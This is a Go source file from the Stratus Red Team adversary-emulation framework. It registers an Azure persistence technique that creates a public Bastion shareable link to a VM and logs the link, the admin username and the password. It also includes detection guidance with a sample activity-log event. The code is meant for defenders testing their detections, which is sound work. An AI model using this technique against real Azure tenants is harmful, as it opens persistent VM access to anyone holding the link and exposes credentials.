package azure

import (
	"context"
	_ "embed"
	"fmt"
	"encoding/json"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/network/armnetwork/v6"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.persistence.create-bastion-shareable-link",
		FriendlyName: "Create Azure VM Bastion shareable link",
		Description: `
By utilizing the 'shareable link' feature on Bastions where it is enabled, an attacker can create a link to allow access to a virtual machine (VM) from untrusted networks. Public links generated for an Azure Bastion can allow VM network access to anyone with the generated URL.

References:

- https://blog.karims.cloud/2022/11/26/yet-another-azure-vm-persistence.html
- https://learn.microsoft.com/en-us/azure/bastion/shareable-link
- https://microsoft.github.io/Azure-Threat-Research-Matrix/Persistence/AZT509/AZT509/

Warm-up: 

- Create a VM and VNet
- Create an Azure Bastion host with access to the VM, and shareable links enabled

NOTE: Warm-up and cleanup can each take 10-15 minutes to create and destroy the Azure Bastion instance

Detonation: 

- Create an Azure Bastion shareable link with access to the VM
`,
		Detection: `
Identify Azure events of type <code>Microsoft.Network/bastionHosts/createshareablelinks/action</code> and <code>Microsoft.Network/bastionHosts/getShareablelinks/action</code>. A sample of <code>createshareablelinks</code> is shown below (redacted for clarity).

` + codeBlock + `json hl_lines="7"
{
  {
    "category": {
        "value": "Administrative",
        "localizedValue": "Administrative"
    },
    "level": "Informational",
    "operationName": {
        "value": "Microsoft.Network/bastionHosts/createshareablelinks/action",
        "localizedValue": "Creates shareable urls for the VMs under a bastion and returns the urls"
    },
    "resourceGroupName": "stratus-red-team-shareable-link-rg-tz6o",
    "resourceProviderName": {
        "value": "Microsoft.Network",
        "localizedValue": "Microsoft.Network"
    },
    "resourceType": {
        "value": "Microsoft.Network/bastionHosts",
        "localizedValue": "Microsoft.Network/bastionHosts"
    },
    "resourceId": "[removed]/resourceGroups/stratus-red-team-shareable-link-rg-tz6o/providers/Microsoft.Network/bastionHosts/stratus-red-team-shareable-link-bastion-tz6o",
    "status": {
        "value": "Succeeded",
        "localizedValue": "Succeeded"
    },
    "subStatus": {
        "value": "",
        "localizedValue": ""
    },
    "properties": {
        "eventCategory": "Administrative",
        "entity": "[removed]/resourceGroups/stratus-red-team-shareable-link-rg-tz6o/providers/Microsoft.Network/bastionHosts/stratus-red-team-shareable-link-bastion-tz6o",
        "message": "Microsoft.Network/bastionHosts/createshareablelinks/action",
        "hierarchy": "[removed]"
    },
}
` + codeBlock + `
`,
		Platform:                   stratus.Azure,
		IsSlow:                     true,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bastionName := params["bastion_name"]
	resourceGroup := params["resource_group_name"]
	vmId := params["vm_id"]
	vmName := params["vm_name"]
	adminUsername := params["admin_username"]
	// String requires extra quotations for unmarshaling, see below for more on this
	adminPassword := fmt.Sprintf(`"%s"`, params["admin_password"])

	ctx := context.Background()
	cred := providers.Azure().GetCredentials()
	subscriptionID := providers.Azure().SubscriptionID
	clientOptions := providers.Azure().ClientOptions

	client, err := armnetwork.NewClientFactory(subscriptionID, cred, clientOptions)
	if err != nil {
		return fmt.Errorf("failed to create client: %v", err)
	}

	// Create Bastion shareable link
	// Reference method: https://learn.microsoft.com/en-us/rest/api/virtualnetwork/put-bastion-shareable-link/put-bastion-shareable-link
	log.Println("Getting Bastion shareable link for VM " + vmName)

	poller, err := client.NewManagementClient().BeginPutBastionShareableLink(ctx, resourceGroup, bastionName, armnetwork.BastionShareableLinkListRequest{
		VMs: []*armnetwork.BastionShareableLink{{VM: &armnetwork.VM{ID: &vmId}}},
	}, nil)
	if err != nil {
		return fmt.Errorf("failed to create shareable link: %v", err)
	}

	_, err = poller.PollUntilDone(ctx, nil)
	if err != nil {
		return fmt.Errorf("failed to poll results of shareable link request: %v", err)
	}
	log.Println("Shareable link created")

	// Get Bastion shareable link
	// Reference method: https://learn.microsoft.com/en-us/rest/api/virtualnetwork/get-bastion-shareable-link/get-bastion-shareable-link
	// No error is returned by this method
	pager := client.NewManagementClient().NewGetBastionShareableLinkPager(resourceGroup, bastionName, armnetwork.BastionShareableLinkListRequest{
		VMs: []*armnetwork.BastionShareableLink{
			{
				VM: &armnetwork.VM{
					ID: &vmId,
				},
			},
		},
	}, nil)

	for pager.More() {
		page, err := pager.NextPage(ctx)
		if err != nil {
			return fmt.Errorf("failed to get results page: %v", err)
		}
		for _, result := range page.Value {
			log.Println("Bastion shareable link URL: " + *result.Bsl)
		}
	}

	log.Println("Bastion username: " + adminUsername)

	// Password needs to be unmarshaled, as the resulting string from Terraform has json.HTMLEscape applied. Unmarshal is the correct operation, but string needs to be correctly formatted to work (see above).
	var adminPasswordDecoded string
	err = json.Unmarshal([]byte(adminPassword), &adminPasswordDecoded)
	if err != nil{
		return fmt.Errorf("failed to unmarshal password string: %v", err)
	}
	log.Println("Bastion password: " + adminPasswordDecoded)

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	// Reference method: https://learn.microsoft.com/en-us/rest/api/virtualnetwork/delete-bastion-shareable-link/delete-bastion-shareable-link?view=rest-virtualnetwork-2024-03-01&tabs=Go
	bastionName := params["bastion_name"]
	resourceGroup := params["resource_group_name"]
	vmId := params["vm_id"]
	vmName := params["vm_name"]

	ctx := context.Background()
	cred := providers.Azure().GetCredentials()
	subscriptionID := providers.Azure().SubscriptionID
	clientOptions := providers.Azure().ClientOptions

	client, err := armnetwork.NewClientFactory(subscriptionID, cred, clientOptions)
	if err != nil {
		return fmt.Errorf("failed to instantiate ARM Network client: %v", err)
	}

	// Delete shareable link that was previously created
	log.Println("Deleting shareable Bastion link to VM " + vmName)

	poller, err := client.NewManagementClient().BeginDeleteBastionShareableLink(ctx, resourceGroup, bastionName, armnetwork.BastionShareableLinkListRequest{
		VMs: []*armnetwork.BastionShareableLink{{
			VM: &armnetwork.VM{ID: &vmId}},
		}}, nil)
	if err != nil {
		return fmt.Errorf("failed to delete shareable bastion link: %v", err)
	}
	_, err = poller.PollUntilDone(ctx, nil)
	if err != nil {
		return fmt.Errorf("failed to poll results of deleting shareable bastion link: %v", err)
	}

	log.Println("Shareable link deleted")

	return nil
}
